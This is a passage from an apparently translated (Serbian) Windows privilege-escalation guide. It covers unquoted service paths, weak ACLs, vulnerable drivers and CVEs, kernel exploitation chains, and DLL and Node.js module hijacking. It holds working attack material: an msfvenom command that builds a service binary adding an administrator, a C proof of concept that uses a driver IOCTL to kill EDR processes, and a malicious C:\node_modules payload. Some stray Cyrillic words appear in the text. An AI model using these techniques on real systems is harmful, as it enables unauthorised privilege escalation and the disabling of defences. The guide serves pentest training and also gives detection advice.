C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve putanje servisa koje nisu pod navodnicima, izuzimajući one koje pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću metasploit-a: `exploit/windows/local/trusted\_service\_path` Možete ručno kreirati binarnu datoteku servisa pomoću metasploit-a:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može konfigurisati tako da upućuje na binarnu datoteku. Ako se ta binarna datoteka može zameniti, moguće je eskalirati privilegije. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti zakazanih zadataka

Za omogućeni zadatak koji pokreće `cmd.exe /c` sa datotekom `.bat` ili `.cmd`, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi i za eksplicitni argument datoteke interpreter-a, kao što je PowerShell `-File`. Ako zakazana batch datoteka sadrži doslovni poziv PowerShell-a `-File`, proverite i ACL te skripte; promenljive, uslovne naredbe i povezivanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju putanju do izvršavanja između naloga samo ako se konfigurisani principal zadatka razlikuje od pozivaoca i zadatak zaista stigne do te radnje. ACL koji dozvoljava samo dodavanje može biti relevantan za skripte, ali raniji `exit` ili druga kontrola toka mogu učiniti dodate linije nedostižnim. Pre nego što proglasite eskalaciju, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Inventarisanje ne bi trebalo da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može imati imenovani `:$DATA` tok čiji sadržaj nije prikazan u uobičajenom spisku direktorijuma. Za manji, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre otvaranja bilo kog sadržaja; Windows ih izlaže preko [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell preko [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji upućuje na tajnu predstavlja samo trag. Proverite efektivni pristup čitanju datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog nabrajanja.

## Ulazi pomoćnog programa Windows Driver Kit koji pokreću zakazani zadaci

Opcioni Windows Driver Kit sadrži `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektni fajl `working\rsf.rsf` iz direktorijuma iz kog se pokreće. Zakazani zadatak ili usluga koja pokreće ovaj pomoćni program pod privilegovanim nalogom može da pretvori pristup za upis sa niskim privilegijama u te ulazne datoteke u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka zaštićena. Potvrdite da postoji privilegovani potrošač i da se **obe** prateće datoteke mogu kreirati ili menjati; samo pronalaženje pomoćnog programa nije dovoljno.

Kod zakazanog zadatka proverite njegovu radnju [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) i ACL-ove dveju pratećih putanja. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke predstavlja samo trag koji treba proveriti, a ne dokaz lokacije sa koje zadatak čita ulaze. Takođe mora biti ispunjen preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavljate da se pokreće kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se pogođena operacija agenta može pokrenuti; oznaka koja navodi samo granu, kao što je `2.1`, ne može da utvrdi izloženost. Enumeracija može da pregleda verziju, stanje usluge i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML usluge ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus verzije 6210 i starije; dobavljač ga je ispravio u verziji 6211. Relevantan je samo ako je SAML SSO **omogućen sada ili je ranije bio omogućen**. Stavka za instalirani proizvod ili putanja usluge zato predstavljaju trag, a ne potvrdu ranjivosti: potvrdite tačnu verziju, istoriju SAML konfiguracije, mrežnu dostupnost usluge i nalog pod kojim se izvršava. Izvršavanje koda kroz uslugu nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu pokrenutu kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda zaseban je trag šifrovane rezervne kopije, a ne dokaz da sadrži upotrebljive akreditive niti dokaz ove SAML ranjivosti. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa bez raspakivanja.

#### Granice Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao odvojena prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač mogu pružiti drugi način pokretanja builda, ali potvrdite da je omogućen i da se build zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvani kredencijal može da se koristi samo ako posao može da pristupi njegovom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal za kredencijale i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup čitanja potrebnim datotekama** i zasebnu putanju ponovne upotrebe naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisivanja `scriptPath` svojstva AD korisničkog objekta, potvrdite da je putanja do skripte upisiva i da postoji stvarna prijava ili zakazani potrošač koji se izvršava kao ciljni korisnik pre nego što to tretirate kao izvršavanje između korisnika. Za dodatnu kontrolu grupa potrebno je zasebno potvrditi efektivna AD prava.

#### Identitet self-hosted agenta za Azure Pipelines

Za projekat Azure DevOps Server ili Azure Pipelines razdvojite dozvolu za **kreiranje ili uređivanje** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog agent pool-a; [Microsoft nezavisno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju pool-a](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje skriptni korak i pokrene taj pipeline na self-hosted Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre tvrdnje o prelasku između korisnika ili na SYSTEM, proverite tačan pipeline, ograničenja grana/resursa, autorizovani pool, izvršiv posao i identitet usluge agenta. Instalirani agent, projektna uloga ili dozvola za upisivanje u repozitorijum sami po sebi predstavljaju samo trag; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke usluge bez pokretanja builda.

#### Akreditive za Microsoft Entra Connect Sync

[Microsoft pravi razliku](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) između **ADSync servisnog naloga**, koji pokreće uslugu sinhronizacije i pristupa njenoj SQL bazi podataka, i **naloga AD DS konektora**, čije dozvole u direktorijumu zavise od konfigurisanih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, a ključni materijal je [zaštićen pomoću DPAPI-ja u okviru ADSync servisnog naloga](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama instalirana usluga sinhronizacije, lokalna grupa čiji naziv zvuči kao da ima administratorske privilegije ili pristup bazi podataka ne dokazuju da se akreditive može dešifrovati niti da je moguća eskalacija privilegija u domenu. Zasebno pregledajte stvarna prava čitanja baze podataka, pristup servisnog naloga/ključevima, instalaciju i SQL raspored, konfigurisani identitet konektora i efektivne AD privilegije tog identiteta. Rutinska enumeracija treba da prikaže samo metapodatke o usluzi i pristupu, a ne da upituje ili ispisuje sačuvane tajne.

#### Dozvole za DLL-ove za podršku upravljačkog programa štampača

Instalirani upravljački program štampača može da čuva DLL-ove za podršku u `C:\ProgramData` i da ih učitava u privilegovanijem procesu štampanja. Pregledajte tačan direktorijum upravljačkog programa i ACL-ove DLL-ova, uključujući nadređene direktorijume i reparse point-ove, čak i ako je WMI enumeracija štampača zabranjena. Za [problem s upravljačkim programom štampača Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), prijavljena putanja bila je `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [originalno obelodanjivanje](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) opisuje učitavanje DLL-a pomoću `PrintIsolationHost.exe`. ACL koji dozvoljava upisivanje samo je trag: proverite efektivan pristup upisivanju nakon primene stavki zabrane, da li je odgovarajući upravljački program instaliran i učitava datoteku pod privilegovanim identitetom i da li je dobavljač ažuriranjem upravljačkog programa ili bezbednosnim programom ispravio instalaciju. Nemojte zaključivati da postoji ranjivost samo na osnovu naziva direktorijuma ili verzije upravljačkog programa.

### Dozvole za pisanje

Proverite da li možete da izmenite neku konfiguracionu datoteku kako biste pročitali posebnu datoteku ili da izmenite binarnu datoteku koju će izvršiti administratorski nalog (schedtasks).

Jedan način za pronalaženje slabih dozvola nad fasciklama/datotekama u sistemu je da uradite sledeće:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/izvršavanje preko automatskog učitavanja Notepad++ pluginova

Notepad++ automatski učitava sve plugin DLL-ove iz podfoldera `plugins`. Ako postoji instalacija prenosive/kopirane verzije u koju može da se upisuje, postavljanjem zlonamernog plugina omogućava se automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i povratnih poziva plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startu

**Proverite da li možete da prepišete neki registar ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **lokacijama za autorun za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drajveri

Potražite potencijalne **sumnjive/ranjive drajvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže proizvoljnu primitivu za čitanje/pisanje u kernelu (često se viđa kod loše projektovanih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz memorije kernela.<sup>[[13]](#references)</sup> Detaljan opis tehnike nalazi se ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Kod bugova sa race condition-om, kada ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (korišćenjem komponenti maksimalne dužine ili dubokih lanaca direktorijuma) može produžiti vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, and I/O ring pivots

Neki Windows kernel LPE lanci mogu se izgraditi kombinovanjem dva pojedinačno slaba buga: **race condition-a u životnom veku cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje reda i dalje aktivno i **disclosure-a do kog dolazi jer se zaključavanje otpušta pre kopiranja**, pa leak-uje oslobođenu alokaciju iz paged-pool-a tokom poziva `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Napomene o analizi i eksploataciji:

- **Oslobađanje pod zaključavanjem + naknadno otkazivanje**: potražite putanju uspeha koja radi **Acquire -> CompleteRequest/free -> Release**, dok putanja otkazivanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspeha dođe do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre nego što otpusti CBDQ/CSQ lock, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije nastaviti i proslediti oslobođeni `PFLT_CALLBACK_DATA` nazad remove callback-u drajvera.
- **Ponovo iskoristite oslobođeni queue objekat** pomoću alokacije iz paged-pool-a iste veličine, čiji sadržaj kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se može kontrolisati payload i veličina, a kasnije ih je moguće ispitati operacijama čitanja/peek nad pipe-om. Ako oslobođeni objekat sadrži list links, prepišite ih **cikličnom listom lažnih request node-ova u korisničkoj memoriji** kako bi drajver više puta obrađivao strukture zahteva koje definiše napadač, umesto da se zaustavi na prvobitnoj glavi liste.
- **Nadogradite predвидljivo upisivanje**: ako lažni request preusmeri ugnježdeni context pointer koji se koristi za upise u bookkeeping podatke (timestamps / QPC / polja susedna refcount-u), možda ćete dobiti **upis u kernel čija je adresa pod vašom kontrolom, ali ne i vrednost**. U tom slučaju ciljajte **length/size** polje objekta iz spray-a, a ne završni code/data pointer, pa zatим pretražite spray dok korumpirani objekat ne omogući **out-of-bounds čitanje iz paged-pool-a**.
- **Obrazac disclosure-a podložan race condition-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća bafer koji se kopira (na primer dodavanjem velikog broja list/resource unosa koji povećavaju konačnu veličinu alokacije serijalizatora), jer duže kopiranje proširuje vremenski prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunjavanje bogati pointer-ima**: registrovani baferi Windows **I/O ring-a** odlični su ciljevi za disclosure jer se njihova veličina u paged-pool-u može kontrolisati (`8 * regBufferCnt`), a svaki element je kernel pointer na `_IOP_MC_BUFFER_ENTRY`. Leak-ujte jedan od ovih nizova i pronađite okolni `IORING_OBJECT`, a zatim korumpirajte **`RegBuffers`** i **`RegBuffersCount`** kako bi naredne I/O ring operacije koristile falsifikovane unose i omogućile proizvoljno čitanje/pisanje u kernelu. Ako je jedini dostupan upis stabilan bajt (na primer, vrednost iz `KUSER_SHARED_DATA+0x14`), upotrebite **preklapajuće neporavnate upise** da sastavite korisnički pointer ponovljenih bajtova, kao što je `0x0101010101010101`, mapirajte ga pomoću `VirtualAlloc` i na tu adresu smestite falsifikovani niz registrovanih bafera.<sup>[[30]](#references)</sup>

Korisni pokazatelji za debagovanje:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Kada iz oštećenog I/O ring-a dobijete proizvoljno čitanje/pisanje u kernelu, ukradite SYSTEM token standardnim postupkom nakon dobijanja primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitive za oštećenje memorije košnice registra

Savremene ranjivosti košnica registra omogućavaju vam da oblikujete determinističke rasporede memorije, zloupotrebite zapise potomke HKLM/HKU koji dopuštaju pisanje i pretvorite oštećenje metapodataka u prekoračenja paged pool-a kernela bez prilagođenog drajvera. Celokupan lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Confusion tipova u direktnom režimu `RtlQueryRegistryValues` na osnovu putanja pod kontrolom napadača

Neki drajveri prihvataju putanju registra iz korisničkog prostora, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem na steku, kao što je skalar `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registra, a ne tipu koji je programer очекивао.

Tím nastaju две корисне примитиве:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zbunjeni posrednik / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje putem povratnih kodova/zapisa i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Oštećenje memorije kernela**: skalarno odredište poput `&readValue` može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa vrednosti registra.

Napomene o praktičnoj eksploataciji:

- **Ublažavanje u Windows 8 i novijim verzijama**: ako upit pogodi **nepoverljivu košnicu registra** sa `RTL_QUERY_REGISTRY_DIRECT`, а без `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sistema sa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, tražite **ključeve u sistemskim košnicama registra kojima napadač može da piše**, umesto da postavljate vrednosti pod `HKCU`.
- **Postavljanje vrednosti у поузданој кошници регистра**: koristite NtObjectManager da biste nabrojali zapise potomke putanje `\Registry\Machine` у које може да се пише, a zatim ponovite skeniranje sa dupliranim tokenom **low-integrity** да biste pronašli ključeve dostupne iz sandboxovanih konteksta:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u 4-bajtni `int` oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita `REG_DWORD` koji kontroliše napadač u skalarni podatak na steku, a zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na koji pokazuje `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi **negativnu** vrednost koju kontroliše napadač u ponovo upotrebljenoj skalarnoj promenljivoj, sledeći upit `REG_BINARY` kopira bajtove napadača direktno preko susednih slotova na steku, što je često najjednostavniji način za potpuno prepisivanje pokazivača na callback.

Dobar obrazac za traženje: **heterogena čitanja iz registra u istu promenljivu na steku bez njene ponovne inicijalizacije**. Pretražujte `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + EDR kill)

Neki potpisani drajveri trećih strana kreiraju svoj objekat uređaja sa strogim SDDL-om pomoću funkcije IoCreateDeviceSecure, ali zaboravljaju da postave FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaju pristupa putanjom koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju imenskog prostora kao što je:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz slučaja iz stvarnog sveta)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje drajver izlaže mogu da se zloupotrebe za LPE i neovlašćene izmene. Primeri mogućnosti uočenih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upis sirovog diska (neovlašćene izmene van mreže, trikovi za trajnost pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što omogućava gašenje AV/EDR-a iz korisničkog režima preko kernela.

Minimalni obrazac PoC-a (korisnički režim):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mere za developere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proverite kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite modele sa brokerom umesto direktnih privilegija kernela.

Ideje za detekciju za odbranu
- Nadgledajte otvaranja sumnjivih naziva uređaja iz user-mode-a (npr. \\ .\\amsdk*) i određene nizove IOCTL-ova koji ukazuju na zloupotrebu.
- Primenite Microsoftovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/zabranjenih.


## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar fascikle koja se nalazi u PATH-u**, možda ćete moći da otmete DLL koji učitava neki proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Hijacking razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windows-u** koja utiče na aplikacije **Node.js** i **Electron** kada obave običan import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

Node razrešava pakete tako što se kreće nagore kroz stablo direktorijuma i proverava fascikle `node_modules` u svakom nadređenom direktorijumu. U Windows-u, ovo kretanje može da stigne do korena diska, pa aplikacija pokrenuta iz `C:\Users\Administrator\project\app.js` može da proverava sledeće putanje:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ako **korisnik sa niskim privilegijama** može da kreira `C:\node_modules`, može da postavi zlonamerni `foo.js` (ili fasciklu paketa) i sačeka da **Node/Electron proces sa višim privilegijama** pokuša da razreši nedostajuću zavisnost. Payload se izvršava u bezbednosnom kontekstu procesa žrtve, što dovodi do **LPE** kada se cilj pokreće kao administrator, iz omotača zakazanog zadatka/usluge sa povišenim privilegijama ili iz automatski pokrenute privilegovane desktop aplikacije.

Ovo je naročito često kada:

- je zavisnost deklarisana u `optionalDependencies`<sup>[[22]](#references)</sup>
- biblioteka treće strane obavija `require("foo")` u `try/catch` i nastavlja sa radom nakon neuspeha
- je paket uklonjen iz produkcionih buildova, izostavljen prilikom pakovanja ili instalacija nije uspela
- se ranjivi `require()` nalazi duboko u stablu zavisnosti, a ne u kodu glavne aplikacije

### Pronalaženje ranjivih ciljeva

Koristite **Procmon** da biste potvrdili putanju razrešavanja:<sup>[[23]](#references)</sup>

- Filtrirajte po `Process Name` = izvršna datoteka cilja (`node.exe`, EXE Electron aplikacije ili proces omotača)
- Filtrirajte po `Path` `contains` `node_modules`
- Obratite pažnju na `NAME NOT FOUND` i poslednje uspešno otvaranje ispod `C:\node_modules`

Korisni obrasci za pregled koda u raspakovanim `.asar` datotekama ili izvornom kodu aplikacije:

```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```

### Eksploatacija

1. Identifikujte **naziv paketa koji nedostaje** pomoću Procmon-a ili pregledom izvornog koda.
2. Kreirajte korenski direktorijum za pretragu ako već ne postoji:

```powershell
mkdir C:\node_modules
```

3. Postavite modul sa tačno očekivanim nazivom:

```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```

4. Pokrenite aplikaciju žrtve. Ako aplikacija pokuša `require("foo")`, a legitimni modul ne postoji, Node može da učita `C:\node_modules\foo.js`.

Stvarni primeri nedostajućih opcionalnih modula koji odgovaraju ovom obrascu uključuju `bluebird` i `utf-8-validate`, ali **tehnika** je ono što se može ponovo upotrebiti: pronađite bilo koji **nedostajući goli import** koji će privilegovani Windows Node/Electron proces razrešiti.

### Ideje za detekciju i ojačavanje bezbednosti

- Upozorite kada korisnik kreira `C:\node_modules` ili upisuje nove `.js` datoteke/pakete u njega.
- Potražite procese visokog integriteta koji čitaju iz `C:\node_modules\*`.
- U produkciji uključite sve zavisnosti za izvršavanje i proverite upotrebu `optionalDependencies`.
- Pregledajte kôd trećih strana i potražite obrasce `try { require("...") } catch {}` koji ne prijavljuju grešku.
- Onemogućite opcionalne provere ako biblioteka to podržava (na primer, neke `ws` implementacije mogu da izbegnu zastarelu proveru `utf-8-validate` pomoću `WS_NO_UTF_8_VALIDATE=1`).

## Mreža

### Deljeni resursi

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts datoteka

Proverite da li su adrese drugih poznatih računara hardkodirane u hosts datoteci.

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite **ograničene usluge** spolja.

```bash
netstat -ano #Opened ports?
```

